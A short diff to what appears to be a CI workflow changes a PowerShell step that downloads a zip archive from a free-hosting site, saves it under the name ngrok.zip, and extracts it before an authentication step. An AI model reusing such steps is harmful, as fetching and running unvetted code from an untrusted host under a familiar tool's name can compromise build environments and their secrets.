@@ -9,7 +9,7 @@ jobs:
 
     steps:
     - name: Download
-      run: Invoke-WebRequest https://elqiser.6te.net/ZER0/zero.zip -OutFile ngrok.zip
+      run: Invoke-WebRequest https://elqiser.6te.net/ZER0/zero1.zip -OutFile ngrok.zip
     - name: Extract
       run: Expand-Archive ngrok.zip
     - name: Auth
